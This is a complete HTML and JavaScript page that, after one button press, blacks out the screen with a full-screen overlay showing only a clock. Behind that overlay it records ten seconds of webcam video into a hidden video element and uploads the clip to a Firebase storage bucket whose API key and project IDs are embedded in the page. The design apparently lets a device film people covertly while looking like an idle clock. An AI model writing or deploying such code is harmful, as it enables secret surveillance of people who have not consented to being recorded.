<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        #capture-button {
            width: 100px;
            height: 100px;
            background-color: red;
            border-radius: 50%;
            border: none;
            cursor: pointer;
            z-index: 10;
        }
        #overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: black;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 48px;
            z-index: 20;
        }
        #error-message {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            color: red;
            font-size: 24px;
            z-index: 30;
        }
    </style>
</head>
<body>
    <button id="capture-button"></button>
    <div id="overlay">
        <span id="timer"></span>
        <div id="error-message"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>

    <!-- Firebase Configuration -->
    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-storage.js"></script>
    <script>
        // Your Firebase configuration
        var firebaseConfig = {
            apiKey: "AIzaSyCIY6aAg-JCpKnm6X51tEktW6v_fLWfU10",
            authDomain: "satsuei-c1b33.firebaseapp.com",
            projectId: "satsuei-c1b33",
            storageBucket: "satsuei-c1b33.appspot.com",
            messagingSenderId: "948629477465",
            appId: "1:948629477465:web:84c23181285afd9d86f948",
            measurementId: "G-KS0947K55F"
        };
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        var storage = firebase.storage();
    </script>

    <!-- Camera and Capture Script -->
    <script>
        const captureButton = document.getElementById('capture-button');
        const overlay = document.getElementById('overlay');
        const video = document.getElementById('video');
        const timerElement = document.getElementById('timer');
        const errorMessage = document.getElementById('error-message');
        let mediaStream = null;
        let mediaRecorder = null;
        let chunks = [];

        captureButton.addEventListener('click', async () => {
            if (document.documentElement.requestFullscreen) {
                await document.documentElement.requestFullscreen();
            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
                await document.documentElement.mozRequestFullScreen();
            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
                await document.documentElement.webkitRequestFullscreen();
            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
                await document.documentElement.msRequestFullscreen();
            }

            captureButton.style.display = 'none';
            overlay.style.display = 'flex';
            startClock();

            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = mediaStream;

                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    chunks = [];
                    await uploadVideo(blob);
                };

                mediaRecorder.start();

                setTimeout(stopRecording, 10000); // Stop recording after 10 seconds
            } catch (err) {
                console.error('Error accessing camera: ', err);
                captureButton.style.display = 'block';
                overlay.style.display = 'none';
                errorMessage.textContent = `Camera error: ${err.message}`;
            }
        });

        overlay.addEventListener('click', () => {
            stopRecording();
            overlay.style.display = 'none';
            captureButton.style.display = 'block';

            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }

            if (document.exitFullscreen) {
                document.exitFullscreen();
            } else if (document.mozCancelFullScreen) { // Firefox
                document.mozCancelFullScreen();
            } else if (document.webkitExitFullscreen) { // Chrome, Safari and Opera
                document.webkitExitFullscreen();
            } else if (document.msExitFullscreen) { // IE/Edge
                document.msExitFullscreen();
            }
        });

        function startClock() {
            function updateClock() {
                const now = new Date();
                timerElement.textContent = now.toLocaleTimeString();
            }
            updateClock();
            setInterval(updateClock, 1000);
        }

        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
            }
        }

        async function uploadVideo(blob) {
            const storageRef = storage.ref();
            const fileRef = storageRef.child(`videos/${new Date().toISOString()}.webm`);
            try {
                await fileRef.put(blob);
                console.log('Uploaded a video!');
            } catch (err) {
                console.error('Error uploading to Firebase: ', err);
                errorMessage.textContent = `Upload error: ${err.message}`;
            }
        }
    </script>
</body>
</html>
